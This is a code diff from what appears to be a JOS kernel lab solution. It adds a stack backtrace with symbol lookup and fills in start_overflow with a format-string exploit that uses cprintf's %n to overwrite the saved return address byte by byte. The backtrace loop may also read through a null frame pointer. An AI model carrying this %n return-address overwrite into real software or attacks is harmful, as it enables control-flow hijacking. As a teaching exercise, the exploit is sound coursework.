@@ -86,11 +86,17 @@ start_overflow(void)
     char str[256] = {};
     int nstr = 0;
     char *pret_addr;
+	int ovfl_byte[8] = { 0x5c, 0x9, 0x10, 0xf0, 0x82, 0xb, 0x10, 0xf0};
 
 	// Your code here.
-    
-
-
+	// use %n overwrite return address
+    pret_addr = (char *)read_pretaddr();
+	for (int i = 0 ; i < 8 ; i++) {
+		char *ovfl_addr = pret_addr + i;
+		memset(str, 0, sizeof(str));
+		memset(str, 0xd, ovfl_byte[i]);
+		cprintf("%s%n", str, ovfl_addr);
+	}
 }
 
 void
@@ -104,23 +110,37 @@ mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 {
 	// Your code here.
 	cprintf("Stack backtrace:\n");
-	uint32_t eip, *ebp;
-	uint32_t args[5];
+	uintptr_t eip;
+	size_t *ebp;
+	size_t args[5];
+	struct Eipdebuginfo info;
 
+	eip = (uintptr_t)read_eip();
 	ebp = (uint32_t *)read_ebp();
 	while (ebp != (uint32_t *)0) {
 		// get return address and 5 arguments from 8 bytes offset
-		eip = *(ebp + 1);
 		for (int i = 0 ; i < 5 ; i++) 
 			args[i] = *(ebp + 2 + i);
 		cprintf("  eip %08x  ebp %08x  args %08x %08x %08x %08x %08x\n",
 				eip, ebp, args[0], args[1], args[2], args[3], args[4]);
+
+		// get eip info from kdebug
+		if (debuginfo_eip(eip, &info) < 0) {
+			cprintf("Find eip information failed\n");
+			return -1;
+		}
+		char buf[512];
+		strncpy(buf, info.eip_fn_name, info.eip_fn_namelen);
+		buf[info.eip_fn_namelen] = '\0';
+		cprintf("\t %s:%d %s+%d\n", info.eip_file, info.eip_line, buf, eip - info.eip_fn_addr);
+		
 		// get base pointer of caller frame
-		ebp = (uint32_t *)*ebp;
+		ebp = (size_t *)*ebp;
+		eip = *(ebp + 1);
 	}
 
 	overflow_me();
-    	cprintf("Backtrace success\n");
+    cprintf("Backtrace success\n");
 	return 0;
 }
 
